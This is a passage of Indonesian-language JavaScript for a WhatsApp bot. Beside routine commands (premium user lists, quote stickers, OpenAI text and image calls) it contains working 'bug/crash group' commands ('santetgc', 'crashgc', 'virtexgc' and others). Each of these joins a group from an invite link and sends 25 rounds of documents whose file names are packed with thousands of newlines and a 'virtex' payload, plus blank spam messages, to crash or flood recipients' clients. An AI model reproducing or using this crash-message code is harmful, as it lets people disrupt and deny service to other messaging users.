xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
}}else{
reply(`*Maaf Group Ini Tidak Tersedia Di Database Jadinya Gabisa Menggunakan Fitur Ini*`)}
}
break
//====================================================================//
case "santetgc": case "buggc": case "crashgc": case "mentalgc": case "virtexgc": case "bomgc": {
if (!isGroup) return reply(mess.group)
if (!text) return reply(`*Contoh ${command} link group*`)
id = m.key.remoteJid
if (cekGrup(id,grup)) {
let t1 = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let t2 = await xd.groupAcceptInvite(t1)
jumlah = "25"
reply(`*Berhasil Mengirim :* ${command}\n*Jangan Lupa Jeda 5 Menit*`)
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
xd.groupLeave(t2)
}}else{
reply(`*Maaf Group Ini Tidak Tersedia Di Database Jadinya Gabisa Menggunakan Fitur Ini*`)}
}
break
//====================================================================//
case "delgc":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} idgc*`)
unp = grup.indexOf(from)
grup.splice(unp, 1)
fs.writeFileSync('./database/grup.json', JSON.stringify(grup))
reply(`*Sukses Grup Ini Telah Di Hapus Di Database*`)
break
//====================================================================//
case "addgc":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} idgc*\n*Cara Liat idgc Nya Ketik idgc*`)
grup.push(from)
fs.writeFileSync('./database/grup.json', JSON.stringify(grup, null, 2))
reply(`*Sukses Group Ini Telah Terdaftar Di Database*`)
break
//====================================================================//
case "addprem":
if (!isGroup) return reply(mess.group) 
if (!isOwner) return reply(mess.owner) 
if (!args[0]) return reply(`*Contoh ${command} 6285793433348*`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await xd.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`*Nomer Ini Tidak Terdaftar Di WhatsApp*`)
premium.push(bnnd)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`*Nomor ${bnnd} Telah Menjadi User Premium*`)
break
//====================================================================//
case "delprem":
if (!isGroup) return reply(mess.group) 
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`*Contoh ${command} 6285793433348*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`*Nomer ${ya} Sudah Tidak Menjadi User Premium*`)
break
//====================================================================//
case "setppbot":{
if (!isBot && !isOwner) return reply(mess.owner)
if (!/image/.test(mime)) return reply(`*Reply Gambar Dengan Caption ${command}*`)
if (/webp/.test(mime)) return reply(`*Reply Sticker Dengan Caption ${command}*`)
let media = await xd.downloadAndSaveMediaMessage(qmsg)
await xd.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply(`*Done*`)
}
break
//====================================================================//
case "qc": {
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`*Contoh ${command} Ruslan Wir*`) 
reply(mess.wait)
const text = `${teks}`
const username = await xd.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await xd.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await xd.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
//====================================================================//
case "ai": case "openai":
try {
if (!text) return reply(`*Contoh ${command} Resep Nasi Goreng*`)
reply(mess.wait)
const configuration = new Configuration({ apiKey: apiai });
const openai = new OpenAIApi(configuration);            
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: text,
temperature: 0.3,
max_tokens: 3000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
reply(`${response.data.choices[0].text}`)
} catch (err) {
console.log(err)
reply('*Maaf Terjadi Kesalahan*')
}
break
//====================================================================//
case "aiimage":
try {
if (!text) return reply(`*Contoh ${command} Wibu Sejati*`)
reply(mess.wait)
const configuration = new Configuration({ apiKey: apiai });
const openai = new OpenAIApi(configuration);
const resd = await openai.createImage({
prompt: text,
n: 1,
size: "1024x1024",
});
xd.sendImage(m.chat, resd.data.data[0].url, `*Result*`, m)
} catch (err) {
console.log(err)
reply('*Maaf Terjadi Kesalahan*')
}
break
//====================================================================//
default:
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
xd.sendMessage("6285793433348@s.whatsapp.net", {text:e})
}}
//====================================================================//
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyanBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})